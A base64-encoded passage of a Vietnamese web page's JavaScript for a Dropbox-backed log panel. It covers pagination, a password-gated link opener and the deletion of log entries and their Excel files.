QtYWxpZ246Y2VudGVyOyBjb2xvcjpyZWQ7Ij4NCiAgICAgIEtow7RuZyB0aOG7gyB04bqjaSBk4buvIGxp4buHdQ0KICAgIDwvdGQ+PC90cj5gOw0KICB9DQp9DQooZnVuY3Rpb24oKXsNCiAgY29uc3QgcGFnZXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZHJvcGJveFBhZ2VyJyk7DQogIGlmIChwYWdlciAmJiAhcGFnZXIuZGF0YXNldC5ib3VuZCkgew0KICAgIHBhZ2VyLmRhdGFzZXQuYm91bmQgPSAnMSc7DQogICAgcGFnZXIuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBlID0+IGUuc3RvcFByb3BhZ2F0aW9uKCkpOw0KICAgIHBhZ2VyLmFkZEV2ZW50TGlzdGVuZXIoJ21vdXNlZG93bicsIGUgPT4gZS5zdG9wUHJvcGFnYXRpb24oKSk7DQogIH0NCn0pKCk7DQoNCjwvc2NyaXB0Pg0KDQoNCg0KPHNjcmlwdD4NCmZ1bmN0aW9uIHZlcmlmeUFuZE9wZW5MaW5rKHVybCkgew0KDQoNCiAgLy8gT3ZlcmxheSB04buRaSAoY2xpY2sgdsOgbyBz4bq9IHThuq90KQ0KICBjb25zdCBvdmVybGF5ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQogIE9iamVjdC5hc3NpZ24ob3ZlcmxheS5zdHlsZSwgew0KICAgIHBvc2l0aW9uOiAnZml4ZWQnLCBpbnNldDogJzAnLCBiYWNrZ3JvdW5kOiAncmdiYSgwLDAsMCwwLjUpJywNCiAgICBkaXNwbGF5OiAnZmxleCcsIGp1c3RpZnlDb250ZW50OiAnY2VudGVyJywgYWxpZ25JdGVtczogJ2NlbnRlcicsDQogICAgekluZGV4OiAnMTAwMDAnDQogIH0pOw0KDQogIC8vIEtodW5nIHBvcHVwDQogIGNvbnN0IGJveCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOw0KICBPYmplY3QuYXNzaWduKGJveC5zdHlsZSwgew0KICAgIGJhY2tncm91bmQ6ICcjZmZmJywgcGFkZGluZzogJzI0cHgnLCBib3JkZXJSYWRpdXM6ICcxMHB4JywNCiAgICBtYXhXaWR0aDogJzQyMHB4Jywgd2lkdGg6ICc5MCUnLCBib3hTaGFkb3c6ICcwIDRweCAxMHB4IHJnYmEoMCwwLDAsMC4zKScsDQogICAgZGlzcGxheTogJ2ZsZXgnLCBmbGV4RGlyZWN0aW9uOiAnY29sdW1uJywgYWxpZ25JdGVtczogJ2NlbnRlcicsIGdhcDogJzEycHgnDQogIH0pOw0KDQogIC8vIFRpw6p1IMSR4buBIG5n4bqvbiBn4buNbiAoa2jDtG5nIGPDsyBpY29uL2fhu61pIGThu68gbGnhu4d1KQ0KICBjb25zdCB0aXRsZSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOw0KICB0aXRsZS50ZXh0Q29udGVudCA9ICdOaOG6rXAgbeG6rXQga2jhuql1IMSR4buDIG3hu58gbGluayc7DQogIHRpdGxlLnN0eWxlLmZvbnRXZWlnaHQgPSAnNjAwJzsNCg0KICAvLyDDlCBuaOG6rXAgbeG6rXQga2jhuql1DQogIGNvbnN0IGlucHV0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnaW5wdXQnKTsNCiAgT2JqZWN0LmFzc2lnbihpbnB1dCwgeyB0eXBlOiAncGFzc3dvcmQnLCBwbGFjZWhvbGRlcjogJ03huq10IGto4bqpdScgfSk7DQogIE9iamVjdC5hc3NpZ24oaW5wdXQuc3R5bGUsIHsNCiAgICBwYWRkaW5nOiAnMTBweCcsIHdpZHRoOiAnMTAwJScsIGJvcmRlcjogJzFweCBzb2xpZCAjZGRkJywgYm9yZGVyUmFkaXVzOiAnNnB4Jw0KICB9KTsNCg0KICAvLyBUaMO0bmcgYsOhbyBs4buXaSAo4bqpbiBt4bq3YyDEkeG7i25oKQ0KICBjb25zdCBlcnIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgZXJyLnRleHRDb250ZW50ID0gJ+KdjCBTYWkgbeG6rXQga2jhuql1ISc7DQogIE9iamVjdC5hc3NpZ24oZXJyLnN0eWxlLCB7IGNvbG9yOiAncmVkJywgZm9udFNpemU6ICcxNHB4JywgZGlzcGxheTogJ25vbmUnIH0pOw0KDQogIC8vIE7DunQgeMOhYyBuaOG6rW4NCiAgY29uc3QgYnRuID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnYnV0dG9uJyk7DQogIGJ0bi50ZXh0Q29udGVudCA9ICdYw6FjIG5o4bqtbic7DQogIE9iamVjdC5hc3NpZ24oYnRuLnN0eWxlLCB7DQogICAgcGFkZGluZzogJzEwcHggMTZweCcsIGJhY2tncm91bmQ6ICcjMzQ5OGRiJywgY29sb3I6ICcjZmZmJywNCiAgICBib3JkZXI6ICdub25lJywgYm9yZGVyUmFkaXVzOiAnNnB4JywgY3Vyc29yOiAncG9pbnRlcicNCiAgfSk7DQoNCiAgLy8gUHJvZ3Jlc3MgYmFyICjEkeG6t3QgRMav4buaSSBDw5lORykNCiAgY29uc3QgYmFyV3JhcCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOw0KICBPYmplY3QuYXNzaWduKGJhcldyYXAuc3R5bGUsIHsNCiAgICB3aWR0aDogJzEwMCUnLCBiYWNrZ3JvdW5kOiAnI2RkZCcsIGhlaWdodDogJzZweCcsDQogICAgYm9yZGVyUmFkaXVzOiAnM3B4JywgbWFyZ2luVG9wOiAnMTJweCcNCiAgfSk7DQogIGNvbnN0IGJhciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOw0KICBPYmplY3QuYXNzaWduKGJhci5zdHlsZSwgeyB3aWR0aDogJzAlJywgaGVpZ2h0OiAnMTAwJScsIGJhY2tncm91bmQ6ICcjMzQ5OGRiJyB9KTsNCiAgYmFyV3JhcC5hcHBlbmRDaGlsZChiYXIpOw0KDQogIC8vIEfhuq9uIHbDoG8gRE9NDQogIGJveC5hcHBlbmRDaGlsZCh0aXRsZSk7DQogIGJveC5hcHBlbmRDaGlsZChpbnB1dCk7DQogIGJveC5hcHBlbmRDaGlsZChlcnIpOw0KICBib3guYXBwZW5kQ2hpbGQoYnRuKTsNCiAgYm94LmFwcGVuZENoaWxkKGJhcldyYXApOw0KICBvdmVybGF5LmFwcGVuZENoaWxkKGJveCk7DQogIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQob3ZlcmxheSk7DQoNCiAgLy8gQ2jhurduIGNsaWNrIGLDqm4gdHJvbmcga2jDtG5nIMSRw7NuZw0KICBib3guYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBlID0+IGUuc3RvcFByb3BhZ2F0aW9uKCkpOw0KICAvLyBDbGljayByYSBuZ2/DoGkgxJHhu4MgdOG6r3QNCiAgb3ZlcmxheS5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpID0+IHsNCiAgICBkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKG92ZXJsYXkpOw0KICB9KTsNCg0KICAvLyBY4butIGzDvSB4w6FjIG5o4bqtbg0KICBhc3luYyBmdW5jdGlvbiBzdWJtaXQoKSB7DQogICAgLy8gxJDhu5VpIG3huq10IGto4bqpdSDhu58gxJHDonkNCiAgICBjb25zdCBPSyA9IGlucHV0LnZhbHVlID09PSAnMSEnOw0KDQogICAgaWYgKCFPSykgew0KICAgICAgZXJyLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgcmV0dXJuOw0KICAgIH0NCiAgICBlcnIuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICBidG4uZGlzYWJsZWQgPSB0cnVlOw0KICAgIGlucHV0LmRpc2FibGVkID0gdHJ1ZTsNCg0KICAgIC8vIEFuaW1hdGUgcHJvZ3Jlc3MgbmhhbmggbMOqbiAxMDAlDQogICAgYmFyLnN0eWxlLnRyYW5zaXRpb24gPSAnd2lkdGggMC42cyBlYXNlJzsNCiAgICByZXF1ZXN0QW5pbWF0aW9uRnJhbWUoKCkgPT4gKGJhci5zdHlsZS53aWR0aCA9ICcxMDAlJykpOw0KICAgIHNldFRpbWVvdXQoKCkgPT4gew0KICAgICAgd2luZG93Lm9wZW4odXJsLCAnX2JsYW5rJyk7DQogICAgICBpZiAob3ZlcmxheS5wYXJlbnROb2RlKSBkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKG92ZXJsYXkpOw0KICAgIH0sIDY1MCk7DQogIH0NCg0KICBidG4uYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBzdWJtaXQpOw0KICBpbnB1dC5hZGRFdmVudExpc3RlbmVyKCdrZXlkb3duJywgKGUpID0+IHsNCiAgICBpZiAoZS5rZXkgPT09ICdFbnRlcicpIHN1Ym1pdCgpOw0KICB9KTsNCg0KICAvLyBGb2N1cyBuZ2F5IMO0IG3huq10IGto4bqpdQ0KICBzZXRUaW1lb3V0KCgpID0+IGlucHV0LmZvY3VzKCksIDApOw0KfQ0KDQpmdW5jdGlvbiBleHRyYWN0RmlsZW5hbWUoZHJvcGJveFByZXZpZXdVcmwpIHsNCiAgdHJ5IHsNCiAgICBjb25zdCB1ID0gbmV3IFVSTChkcm9wYm94UHJldmlld1VybCk7DQogICAgY29uc3QgcCA9IHUuc2VhcmNoUGFyYW1zLmdldCgncHJldmlldycpOw0KICAgIHJldHVybiBkZWNvZGVVUklDb21wb25lbnQocCB8fCAnJyk7DQogIH0gY2F0Y2ggeyByZXR1cm4gJyc7IH0NCn0NCg0KLy8gSOG7mXAgeMOhYyBuaOG6rW4geG/DoSAodHLhuqMgduG7gSBQcm9taXNlPGJvb2xlYW4+KQ0KZnVuY3Rpb24gY29uZmlybURlbGV0ZVBvcHVwKHRleHQ9J0LhuqFuIGPDsyBjaOG6r2MgbXXhu5FuIHhvw6E/Jywgb25lQnV0dG9uPWZhbHNlKSB7DQogIHJldHVybiBuZXcgUHJvbWlzZShyZXNvbHZlID0+IHsNCiAgICBjb25zdCBvdmVybGF5ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQogICAgT2JqZWN0LmFzc2lnbihvdmVybGF5LnN0eWxlLCB7DQogICAgICBwb3NpdGlvbjonZml4ZWQnLCBpbnNldDonMCcsIGJhY2tncm91bmQ6J3JnYmEoMCwwLDAsMC41KScsDQogICAgICBkaXNwbGF5OidmbGV4JywgYWxpZ25JdGVtczonY2VudGVyJywganVzdGlmeUNvbnRlbnQ6J2NlbnRlcicsIHpJbmRleDoxMDAwMQ0KICAgIH0pOw0KDQogICAgY29uc3QgYm94ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQogICAgT2JqZWN0LmFzc2lnbihib3guc3R5bGUsIHsNCiAgICAgIGJhY2tncm91bmQ6JyNmZmYnLCBwYWRkaW5nOicyMHB4JywgYm9yZGVyUmFkaXVzOic4cHgnLA0KICAgICAgbWF4V2lkdGg6JzQyMHB4Jywgd2lkdGg6JzkwJScsIGJveFNoYWRvdzonMCA0cHggMTJweCByZ2JhKDAsMCwwLC4yNSknLA0KICAgICAgZm9udEZhbWlseTonSW50ZXIsIHNhbnMtc2VyaWYnDQogICAgfSk7DQoNCiAgICBib3guaW5uZXJIVE1MID0gYA0KICAgICAgPGRpdiBzdHlsZT0iZm9udC13ZWlnaHQ6NjAwOyBtYXJnaW4tYm90dG9tOjhweCI+WMOhYyBuaOG6rW4geG/DoTwvZGl2Pg0KICAgICAgPGRpdiBzdHlsZT0ibWFyZ2luLWJvdHRvbToxNHB4Ij4ke3RleHR9PC9kaXY+DQogICAgICA8ZGl2IHN0eWxlPSJkaXNwbGF5OmZsZXg7IGdhcDoxMHB4OyBqdXN0aWZ5LWNvbnRlbnQ6ZmxleC1lbmQiPg0KICAgICAgICA8YnV0dG9uIGlkPSJkbGdDYW5jZWwiIGNsYXNzPSJidG4iIHN0eWxlPSJiYWNrZ3JvdW5kOiM3ZjhjOGQiPkh14bu3PC9idXR0b24+DQogICAgICAgICR7IW9uZUJ1dHRvbiA/IGA8YnV0dG9uIGlkPSJkbGdZZXMiIGNsYXNzPSJidG4iIHN0eWxlPSJiYWNrZ3JvdW5kOiNlNzRjM2MiPlhvw6E8L2J1dHRvbj5gIDogJyd9DQogICAgICA8L2Rpdj4NCiAgICBgOw0KDQogICAgb3ZlcmxheS5hcHBlbmRDaGlsZChib3gpOw0KICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQob3ZlcmxheSk7DQoNCiAgICBib3guYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBlID0+IGUuc3RvcFByb3BhZ2F0aW9uKCkpOw0KICAgIG92ZXJsYXkuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCAoKSA9PiB7IGRvY3VtZW50LmJvZHkucmVtb3ZlQ2hpbGQob3ZlcmxheSk7IHJlc29sdmUoZmFsc2UpOyB9KTsNCiAgICBib3gucXVlcnlTZWxlY3RvcignI2RsZ0NhbmNlbCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCkgPT4geyBkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKG92ZXJsYXkpOyByZXNvbHZlKGZhbHNlKTsgfSk7DQoNCiAgICBpZiAoIW9uZUJ1dHRvbikgew0KICAgICAgYm94LnF1ZXJ5U2VsZWN0b3IoJyNkbGdZZXMnKS5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpID0+IHsgZG9jdW1lbnQuYm9keS5yZW1vdmVDaGlsZChvdmVybGF5KTsgcmVzb2x2ZSh0cnVlKTsgfSk7DQogICAgfQ0KICB9KTsNCn0NCg0KLy8gWG/DoSAxIGVudHJ5IGxvZyArIGZpbGUgRXhjZWwgdHLDqm4gRHJvcGJveCAodGhlbyBpbmRleCB0cm9uZyBt4bqjbmcgbG9ncykNCmFzeW5jIGZ1bmN0aW9uIGRlbGV0ZUxvZ0FuZEZpbGVfQnlJbmRleChpZHgpIHsNCiAgY29uc3QgYWNjZXNzVG9rZW4gPSBhd2FpdCBnZXRBY2Nlc3NUb2tlbigpOw0KICBjb25zdCBkYnggPSBuZXcgRHJvcGJveC5Ecm9wYm94KHsgYWNjZXNzVG9rZW4gfSk7DQogIGNvbnN0IGxvZ1BhdGggPSAnL3RodXRodWF0L2xvZy5qc29uJzsNCg0KICAvLyAxKSBU4bqjaSBsb2cuanNvbiBoaeG7h24gdOG6oWkNCiAgbGV0IGxvZ3MgPSBbXTsNCiAgdHJ5IHsNCiAgICBjb25zdCBkbCA9IGF3YWl0IGRieC5maWxlc0Rvd25sb2FkKHsgcGF0aDogbG9nUGF0aCB9KTsNCiAgICBjb25zdCB0ZXh0ID0gYXdhaXQgZGwucmVzdWx0LmZpbGVCbG9iLnRleHQoKTsNCiAgICBsb2dzID0gSlNPTi5wYXJzZSh0ZXh0IHx8ICdbXScpOw0KICB9IGNhdGNoIChlKSB7DQogICAgYWxlcnQoJ0tow7RuZyDEkeG7jWMgxJHGsOG7o2MgbG9nLmpzb24gdHLDqm4gRHJvcGJveC4nKTsgDQogICAgdGhyb3cgZTsNCiAgfQ0KDQogIGNvbnN0IGl0ZW0gPSBsb2dzW2lkeF07DQogIGlmICghaXRlbSkgeyBhbGVydCgnS2jDtG5nIHTDrG0gdGjhuqV5IG3hu6VjIGPhuqduIHhvw6EuJyk7IHJldHVybjsgfQ0KDQogIC8vIDIpIEzhuqV5IGZpbGVOYW1lICYgeG/DoSBmaWxlIEV4Y2VsIChu4bq/dSBjw7MpDQogIGNvbnN0IGZpbGVOYW1lID0gZXh0cmFjdEZpbGVuYW1lKGl0ZW0ubGluayB8fCAnJyk7DQogIGNvbnN0IGZpbGVQYXRoID0gZmlsZU5hbWUgPyBgL3RodXRodWF0LyR7ZmlsZU5hbWV9YCA6IG51bGw7DQoNCiAgdHJ5IHsNCiAgICBpZiAoZmlsZVBhdGgpIHsgYXdhaXQgZGJ4LmZpbGVzRGVsZXRlVjIoeyBwYXRoOiBmaWxlUGF0aCB9KTsgfQ0KICB9IGNhdGNoIChlKSB7DQogICAgLy8gTuG6v3UgZmlsZSBraMO0bmcgdOG7k24gdOG6oWkgduG6q24gdGnhur9wIHThu6VjIHhvw6EgbG9nDQogICAgY29uc29sZS53YXJuKCdYb8OhIGZpbGUgRXhjZWwgbOG7l2kva2jDtG5nIHThu5NuIHThuqFpLCB0aeG6v3AgdOG7pWMgeG/DoSBsb2cuLi4nLCBlKTsNCiAgfQ0KDQogIC8vIDMpIEPhuq1wIG5o4bqtdCBsb2c6IGLhu48gcGjhuqduIHThu60gaWR4IHbDoCBnaGkgxJHDqCBs4bqhaQ0KICBsb2dzLnNwbGljZShpZHgsIDEpOw0KICBhd2FpdCBkYnguZmlsZXNVcGxvYWQoew0KICAgIHBhdGg6IGxvZ1BhdGgsDQogICAgY29udGVudHM6IEpTT04uc3RyaW5naWZ5KGxvZ3MsIG51bGwsIDIpLA0KICAgIG1vZGU6IHsgJy50YWcnOiAnb3ZlcndyaXRlJyB9LA0KICAgIGF1dG9yZW5hbWU6IGZhbHNlDQogIH0pOw0KfQ0KDQoNCmFzeW5jIGZ1bmN0aW9uIG9uRGVsZXRlTG9nUm93KGluZGV4SW5Mb2dzLCBjdXJyZW50VXNlcikgew0KICAvLyBO4bq/dSBraMO0bmcgcGjhuqNpIGRvY3RvciDihpIgcG9wdXAgY+G6pW0geG/DoSwgY2jhu4kgY8OzIDEgbsO6dCBIdeG7tw0KICBpZiAoY3VycmVudFVzZXIgIT09ICdkb2N0b3InKSB7DQogICAgYXdhaXQgY29uZmlybURlbGV0ZVBvcHVwKA0KICAgICAgJ+KdjCDDiiBsw6BtIGPDoWkgZ8OsIMSR4bqleXl5eSBlbSDGoWkuIDxici8+ROG7q25nIGzhuqFpIG5nYXksIHF1w6Egbmd1eSBoaeG7g20uJywNCiAgICAgIHRydWUgLy8gPC0tIGNo4bq/IMSR4buZIDEgbsO6dA0KICAgICk7DQogICAgcmV0dXJuOw0KICB9DQoNCiAgLy8gTuG6v3UgbMOgIGRvY3RvciDihpIgcG9wdXAgeMOhYyBuaOG6rW4geG/DoSAoMiBuw7p0KQ0KICBjb25zdCBvayA9IGF3YWl0IGNvbmZpcm1EZWxldGVQb3B1cCgNCiAgICAnQuG6oW4gY8OzIGNo4bqvYyBtdeG7kW4geG/DoSBt4bulYyBuw6B5PycsDQogICAgZmFsc2UNCiAgKTsNCiAgaWYgKCFvaykgcmV0dXJuOw0KDQogIHRyeSB7DQogICAgYXdhaXQgZGVsZXRlTG9nQW5kRmlsZV9CeUluZGV4KGluZGV4SW5Mb2dzKTsNCiAgICBhd2FpdCBjb25maXJtRGVsZXRlUG9wdXAoJ+KchSDEkMOjIHhvw6EgdGjDoG5oIGPDtG5nIScsIHRydWUpOw0KICAgIGF3YWl0IHNob3dEcm9wYm94UGFuZWwoKTsNCiAgfSBjYXRjaCAoZSkgew0KICAgIGNvbnNvbGUuZXJyb3IoZSk7DQogICAgYXdhaXQgY29uZmlybURlbGV0ZVBvcHVwKCfimqDvuI8gQ8OzIGzhu5dpIGtoaSB4b8OhLiBWdWkgbMOybmcgdGjhu60gbOG6oWkuJywgdHJ1ZSk7DQogIH0NCn0NCg0KLy8gxJDDs25nIHBhbmVsIGtoaSBi4bqlbSBFU0MgaG/hurdjIGNsaWNrIHJhIG5nb8OgaQ0KZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigia2V5ZG93biIsIGZ1bmN0aW9uKGUpIHsNCiAgaWYgKGUua2V5ID09PSAiRXNjYXBlIikgew0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJkcm9wYm94UGFuZWwiKS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOw0KICB9DQp9KTsNCg0KZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBmdW5jdGlvbihlKSB7DQogIGNvbnN0IHBhbmVsID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImRyb3Bib3hQYW5lbCIpOw0KICBpZiAocGFuZWwuc3R5bGUuZGlzcGxheSA9PT0gImJsb2NrIiB8fCBwYW5lbC5zdHlsZS5kaXNwbGF5ID09PSAiZmxleCIpIHsNCiAgICBjb25zdCBjb250ZW50ID0gcGFuZWwucXVlcnlTZWxlY3RvcigiZGl2Iik7DQogICAgLy8gTuG6v3UgY2xpY2sgbmdvw6BpIHbDuW5nIG7hu5lpIGR1bmcgcGFuZWwNCiAgICBpZiAoIWNvbnRlbnQuY29udGFpbnMoZS50YXJnZXQpKSB7DQogICAgICBwYW5lbC5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOw0KICAgIH0NCiAgfQ0KfSk7DQoNCjwvc2NyaXB0Pg0KPHNjcmlwdD4NCi8vID09PT09PSBQSMOCTiBUUkFORyBC4bqiTkcgTE9HIFRST05HIFBPUFVQID09PT09PQ0KbGV0IERCX0xPR1MgPSBbXTsgICAgICAgLy8gdG/DoG4gYuG7mSBsb2dzIMSRw6MgdOG6o2kNCmxldCBEQl9QQUdFID0gMTsgICAgICAgIC8vIHRyYW5nIGhp4buHbiB04bqhaQ0KbGV0IERCX1BBR0VfU0laRSA9IDEwOyAgLy8gc+G7kSBkw7JuZyAvIHRyYW5nDQpsZXQgREJfQ1VSUkVOVF9VU0VSID0gJyc7IC8vIHVzZXIgxJFhbmcgxJHEg25nIG5o4bqtcCAobG93ZXJjYXNlKSDEkeG7gyByZW5kZXIgbsO6dCBYb8OhDQoNCmZ1bmN0aW9uIHNldFBhZ2VTaXplKHNpemUpew0KICBEQl9QQUdFX1NJWkUgPSBOdW1iZXIoc2l6ZSkgfHwgMTA7DQogIERCX1BBR0UgPSAxOw0KICByZW5kZXJEcm9wYm94UGFnZSgpOw0KfQ0KDQpmdW5jdGlvbiBnb1RvUGFnZShwKXsNCiAgY29uc3QgbWF4ID0gTWF0aC5tYXgoMSwgTWF0aC5jZWlsKERCX0xPR1MubGVuZ3RoIC8gREJfUEFHRV9TSVpFKSk7DQogIERCX1BBR0UgPSBNYXRoLm1pbihNYXRoLm1heCgxLCBwKSwgbWF4KTsNCiAgcmVuZGVyRHJvcGJveFBhZ2UoKTsNCn0NCg0KZnVuY3Rpb24gcmVuZGVyRHJvcGJveFBhZ2UoKXsNCiAgY29uc3QgdGJvZHkgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZHJvcGJveEZpbGVMaXN0Jyk7DQogIGNvbnN0IHBhZ2VCdG5zID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Ryb3Bib3hQYWdlQnV0dG9ucycpOw0KICBjb25zdCBwYWdlSW5mbyA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkcm9wYm94UGFnZUluZm8nKTsNCg0KICBpZighdGJvZHkpIHJldHVybjsNCg0KICAvLyBy4buXbmc/DQogIGlmKCFBcnJheS5pc0FycmF5KERCX0xPR1MpIHx8IERCX0xPR1MubGVuZ3RoID09PSAwKXsNCiAgICB0Ym9keS5pbm5lckhUTUwgPSBgPHRyPjx0ZCBjb2xzcGFuPSI2IiBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXI7Y29sb3I6cmVkIj5LaMO0bmcgY8OzIGRhbmggc8OhY2ggbsOgbyDEkcaw4bujYyBsxrB1PC90ZD48L3RyPmA7DQogICAgaWYocGFnZUJ0bnMpIHBhZ2VCdG5zLmlubmVySFRNTCA9ICcnOw0KICAgIGlmKHBhZ2VJbmZvKSBwYWdlSW5mby50ZXh0Q29udGVudCA9ICcnOw0KICAgIHJldHVybjsNCiAgfQ0KDQogIGNvbnN0IHRvdGFsID0gREJfTE9HUy5sZW5ndGg7DQogIGNvbnN0IG1heFBhZ2UgPSBNYXRoLm1heCgxLCBNYXRoLmNlaWwodG90YWwgLyBEQl9QQUdFX1NJWkUpKTsNCiAgaWYoREJfUEFHRSA+IG1heFBhZ2UpIERCX1BBR0UgPSBtYXhQYWdlOw0KDQogIGNvbnN0IHN0YXJ0SWR4ID0gKERCX1BBR0UgLSAxKSAqIERCX1BBR0VfU0laRTsNCiAgY29uc3QgZW5kSWR4ICAgPSBNYXRoLm1pbihzdGFydElkeCArIERCX1BBR0VfU0laRSwgdG90YWwpOw0KICBjb25zdCBzbGljZSAgICA9IERCX0xPR1Muc2xpY2Uoc3RhcnRJZHgsIGVuZElkeCk7DQoNCiAgLy8gUmVuZGVyIGJvZHkgdGhlbyB0cmFuZw0KICB0Ym9keS5pbm5lckhUTUwgPSBzbGljZS5tYXAoKGl0ZW0sIGkpID0+IGANCiAgICA8dHI+DQogICAgICA8dGQ+JHtzdGFydElkeCArIGkgKyAxfTwvdGQ+DQogICAgICA8dGQ+JHtpdGVtLmtob2EgfHwgJyd9PC90ZD4NCiAgICAgIDx0ZD4keyhpdGVtLm5nYXkgfHwgJycpDQogICAgICAgICAgIC5yZXBsYWNlKCcwMDowMDowMCcsJycpDQogICAgICAgICAgIC5yZXBsYWNlKCcyMzo1OTo1OScsJycpDQogICAgICAgICAgIC5yZXBsYWNlKCdU4burJywnJykNCiAgICAgICAgICAgLnJlcGxhY2UoJ8SR4bq/bicsJyAtPiAnKQ0KICAgICAgICAgICAucmVwbGFjZSgvXHMrL2csJyAnKQ0KICAgICAgICAgICAudHJpbSgpfTwvdGQ+DQoJCSAgIA0KCQkgICA8dGQ+JHtOdW1iZXIoaXRlbS5oZXJiX2Vycm9ycyB8fCAwKX08L3RkPg0KICAgICA8dGQ+JHtOdW1iZXIoaXRlbS50aW1lX2Vycm9ycyB8fCAwKX08L3RkPg0KICAgIDx0ZD4ke051bWJlcihpdGVtLmNvbmZsaWN0X2Vycm9ycyB8fCAwKX08L3RkPg0KCQkgICANCiAgICAgIDx0ZD4keyhpdGVtLnRpbWUgfHwgJycpDQogICAgICAgICAgIC5yZXBsYWNlKCcsJywgJycpDQogICAgICAgICAgIC5yZXBsYWNlKCcgJywgJyAtICcpDQogICAgICAgICAgIC5yZXBsYWNlKC9ccysvZywgJyAnKQ0KICAgICAgICAgICAudHJpbSgpfTwvdGQ+DQogICAgICA8dGQ+PGEgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIiBvbmNsaWNrPSJ2ZXJpZnlBbmRPcGVuTGluaygnJHtpdGVtLmxpbmt9JykiPlhlbTwvYT48L3RkPg0KICAgICAgPHRkPg0KICAgICAgICA8YnV0dG9uIGNsYXNzPSJidG4iIHN0eWxlPSJiYWNrZ3JvdW5kOiNlNzRjM2M7IHBhZGRpbmc6MTBweCAxNHB4OyBmb250LXNpemU6MTJweDsiDQogICAgICAgICAgb25jbGljaz0ib25EZWxldGVMb2dSb3coJHtzdGFydElkeCArIGl9LCAnJHtEQl9DVVJSRU5UX1VTRVJ9JykiPg0KICAgICAgICAgIDxpIGNsYXNzPSJmYSBmYS10cmFzaCI+PC9pPiBYb8OhDQogICAgICAgIDwvYnV0dG9uPg0KICAgICAgPC90ZD4NCiAgICA8L3RyPg0KICBgKS5qb2luKCcnKTsNCg0KICAvLyBSZW5kZXIgbsO6dCB0cmFuZyAoUHJldiDigKYgTmV4dCkg4oCUIGhp4buDbiB0aOG7iyBk4bqjaSB04buRaSDEkWEgNyBuw7p0IHPhu5ENCiAgaWYocGFnZUJ0bnMpew0KICAgIGNvbnN0IGJ0biA9IChsYWJlbCwgdGFyZ2V0LCBkaXNhYmxlZD1mYWxzZSwgdGl0bGU9JycpID0+DQogICAgICBgPGJ1dHRvbiBjbGFzcz0iYnRuIiAke2Rpc2FibGVkPydkaXNhYmxlZCc6Jyd9IHRpdGxlPSIke3RpdGxlfSINCiAgICAgICAgICAgICAgIHN0eWxlPSJwYWRkaW5nOjZweCAxMHB4JHtkaXNhYmxlZD8nO29wYWNpdHk6LjY7Y3Vyc29yOm5vdC1hbGxvd2VkJzonJ30iDQogICAgICAgICAgICAgICBvbmNsaWNrPSJnb1RvUGFnZSgke3RhcmdldH0pIj4ke2xhYmVsfTwvYnV0dG9uPmA7DQoNCiAgICBjb25zdCByYW5nZSA9IDM7IC8vIGhhaSBiw6puIHRyYW5nIGhp4buHbiB04bqhaQ0KICAgIGNvbnN0IGZyb20gID0gTWF0aC5tYXgoMSwgREJfUEFHRSAtIHJhbmdlKTsNCiAgICBjb25zdCB0byAgICA9IE1hdGgubWluKG1heFBhZ2UsIERCX1BBR0UgKyByYW5nZSk7DQoNCiAgICBsZXQgaHRtbCA9ICcnOw0KICAgIGh0bWwgKz0gYnRuKCfCqyDEkOG6p3UnLCAxLCBEQl9QQUdFPT09MSwgJ1RyYW5nIMSR4bqndScpOw0KICAgIGh0bWwgKz0gYnRuKCfigLkgVHLGsOG7m2MnLCBEQl9QQUdFLTEsIERCX1BBR0U9PT0xLCAnVHJhbmcgdHLGsOG7m2MnKTsNCiAgICBmb3IobGV0IHAgPSBmcm9tOyBwIDw9IHRvOyBwKyspew0KICAgICAgaHRtbCArPSBgPGJ1dHRvbiBjbGFzcz0iYnRuIiBvbmNsaWNrPSJnb1RvUGFnZSgke3B9KSINCiAgICAgICAgICAgICAgICAgc3R5bGU9InBhZGRpbmc6NnB4IDEwcHg7JHtwPT09REJfUEFHRT8nYmFja2dyb3VuZDojMmVjYzcxJzonJ30iPg0KICAgICAgICAgICAgICAgICAke3B9DQogICAgICAgICAgICAgICA8L2J1dHRvbj5gOw0KICAgIH0NCiAgICBodG1sICs9IGJ0bignU2F1IOKAuicsIERCX1BBR0UrMSwgREJfUEFHRT09PW1heFB